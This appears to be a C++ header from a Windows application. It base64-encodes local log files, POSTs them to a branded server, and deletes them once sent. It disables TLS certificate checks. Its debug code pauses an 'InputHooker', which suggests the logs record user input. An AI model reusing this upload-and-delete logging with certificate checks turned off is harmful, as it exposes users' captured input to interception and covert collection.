#pragma once

#include "httprequest.h"
#include "win-firewall.h"
#include <utility>
#include <string>
#include <atlbase.h>
#include <comutil.h>

#include <boost/archive/iterators/base64_from_binary.hpp>
#include <boost/archive/iterators/insert_linebreaks.hpp>
#include <boost/archive/iterators/transform_width.hpp>
#include <boost/archive/iterators/ostream_iterator.hpp>
#include <boost/archive/iterators/istream_iterator.hpp>
#include <boost/archive/iterators/remove_whitespace.hpp>
#include <boost/archive/iterators/binary_from_base64.hpp>


#include <experimental/resumable>
#include <future>

CComPtr<IWinHttpRequest> CreateHTTPRequest()
{
    CComPtr<IWinHttpRequest> pIXMLHTTPRequest;
    if (FAILED(pIXMLHTTPRequest.CoCreateInstance(L"WinHttp.WinHttpRequest.5.1")))
        throw std::runtime_error("Cannot create HTTP request instance");
    return pIXMLHTTPRequest;
}


template<class Out_t, class In_t>
Out_t encodeToBase64(In_t const& text)
{
    using namespace boost::archive::iterators;
    using base64_text = insert_linebreaks<base64_from_binary<transform_width<typename In_t::const_iterator, 6, sizeof(In_t::value_type) * 8> >, 72 >;

    Out_t encodedStr;
    encodedStr.reserve(text.size() * 2);
    std::copy(
        base64_text(text.begin()),
        base64_text(text.end()),
        std::back_inserter(encodedStr)
    );

    return encodedStr;
}

template<class Out_t, class In_t>
Out_t decodeFromBase64(In_t base64Str)
{
    using namespace boost::archive::iterators;
    using unbase64_text = transform_width<binary_from_base64<remove_whitespace<typename In_t::const_iterator>>, sizeof(Out_t::value_type) * 8, 6>;

    size_t strSize = base64Str.find_last_not_of('=');

    Out_t decodedStr;
    decodedStr.reserve(strSize + 1);
    if (strSize != 0)
        std::copy(
            unbase64_text(base64Str.begin()),
            unbase64_text(base64Str.begin() + strSize + 1),
            std::back_inserter(decodedStr)
        );

    return decodedStr;
}

template <class Out_t>
Out_t readFileToString(std::tr2::sys::path const& filename)
{
    // FIXME: reading utf-8 is byte-to-wchar, it must be wchar-to-wchar, so next single string solution does not work for MSVC2013
    //return Out_t ((std::istreambuf_iterator<typename Out_t::value_type>(std::basic_ifstream<typename Out_t::value_type>(filename.string(), std::ios::binary))), std::istreambuf_iterator<typename Out_t::value_type>());

    Out_t readStr;
    if (std::tr2::sys::is_regular_file(filename, std::error_code())) {
        readStr.resize(std::tr2::sys::file_size(filename, std::error_code()) + 1, '\0');
        FILE* fReadFrom = fopen(filename.string().c_str(), "rb");
        if (fReadFrom) {
            size_t readCount = fread((void*)readStr.data(), sizeof(Out_t::value_type), readStr.size(), fReadFrom);
            fclose(fReadFrom);
            readStr.resize(readCount);
        } else {
            readStr.clear();
            readStr.shrink_to_fit();
        }
    }
    return readStr;
}

template<class T1>
std::wstring paramsToString(std::pair<const char*, T1>&& a)
{
    return std::wstring(a.first, a.first + strlen(a.first)) + _T("=") + //encodeToBase64<std::wstring>(a.second);
           std::wstring(a.second.begin(), a.second.end());
}

template<class T1, class ... Tn>
std::wstring paramsToString(std::pair<const char*, T1>&& first, std::pair<const char*, Tn>&& ... others)
{
    return paramsToString(std::move(first)) + _T("&") + paramsToString(std::move(others)...);
}

// explicit specialization for std::filesystem::path - enclose file content
template<>
std::wstring paramsToString(std::pair<const char*, std::tr2::sys::path>&& a)
{
    return std::wstring(a.first, a.first + strlen(a.first)) + _T("=") + encodeToBase64<std::wstring>(readFileToString<std::string>(a.second));
}

inline void debugTrace(std::wstring const& logMsg)
{
#ifdef _DEBUG
    const auto timestampStr = timestamp(std::chrono::system_clock::now());
    const std::wstring wtimestamp(timestampStr.begin(), timestampStr.end());
    std::wofstream(Logger::instance().logFilename().parent_path() / L"inefan-debug.txt", std::ios::app) << wtimestamp << logMsg << L"\n";
#endif
}

template<class ... T>
std::future<bool> postData(std::wstring const& url, std::pair<const char*, T>&& ... key_values)
{
    try {
#ifdef DEBUG
        // disable hooking while sending
        InputHooker::instance().stopHook();
        auto enableLogger = [](void*) {InputHooker::instance().startHook(); };
        std::unique_ptr<void, decltype(enableLogger)> onRet((void*)1/*must be not nullptr*/, enableLogger);
#endif // DEBUG

        auto postDataImpl = [&]() {
            CoInitialize(NULL);
            auto uninit = [](void*) {CoUninitialize(); };
            std::unique_ptr<void, decltype(uninit)> onRet((void*)1/*must be not nullptr*/, uninit);

            CComPtr<IWinHttpRequest> request = CreateHTTPRequest();
            if (FAILED(request->Open(_bstr_t(L"POST").GetBSTR(), _bstr_t(url.c_str()).GetBSTR(), _variant_t(false))))
                throw std::runtime_error("Cannot create open request");
            if (FAILED(request->SetRequestHeader(_bstr_t(L"Content-Type").GetBSTR(), _bstr_t(L"application/x-www-form-urlencoded").GetBSTR())))
                throw std::runtime_error("Cannot set request header");

            // ignore ssl errors
            request->put_Option(WinHttpRequestOption_SslErrorIgnoreFlags, _variant_t(SslErrorFlag_Ignore_All));

            const auto postData = paramsToString(std::move(key_values)...);
            debugTrace(std::wstring(L"posted\n") + postData);

            if (FAILED(request->Send(_variant_t(postData.c_str()))))
                throw std::runtime_error("Cannot send data");

            _bstr_t content;
            request->get_ResponseText(content.GetAddress());

            const std::wstring decodedReply = content.GetBSTR();
            debugTrace(std::wstring(L"received\n") + decodedReply);
            // TODO: process request

            return content.length() != 0;
        };

        return std::async(std::launch::async, postDataImpl);
    } catch (std::exception const& ee) {
        std::cerr << ee.what();
    }

    return //std::make_ready_future(false);
    std::async([]() {return false;});
}


std::future<bool> postAllNewLogfiles()
{
    auto postNewLogs = [](const time_t postTime) {
        using namespace std::tr2::sys;
        // read last logs sent time
        RegistryHelper reg(HKEY_CURRENT_USER, _T("Software\\") _T(BRAND_COMPANYNAME) _T("\\") _T(BRAND_NAME));
        const time_t lastSentTime = std::stoull(std::wstring(L"0") + reg.readValue(_T("logsPostTime")));
        // get list of new files
        directory_iterator logDirIter(Logger::instance().logFilename().parent_path(), std::error_code());

        bool success = true;
        for (auto& log : logDirIter)
            if (log != Logger::instance().logFilename()) {
                const time_t fileTime = std::chrono::system_clock::to_time_t(last_write_time(log));

                if (is_regular_file(log, std::error_code()) && fileTime >= lastSentTime) {
                    //__yield_value
                    const bool local_success = postData(_T("https://") _T(BRAND_DOMAIN) _T("/inefan/"), std::make_pair("appId", appId()), std::make_pair("logfile", log.path())).get();
                    success = success && local_success;
                    if (local_success)
                        remove(log, std::error_code());
                } else
                    remove(log, std::error_code());
            }
        if (success)
            reg.writeValue(_T("logsPostTime"), std::to_wstring(postTime));
        return success;
    };

    return std::async(std::launch::async, postNewLogs, time(0));
}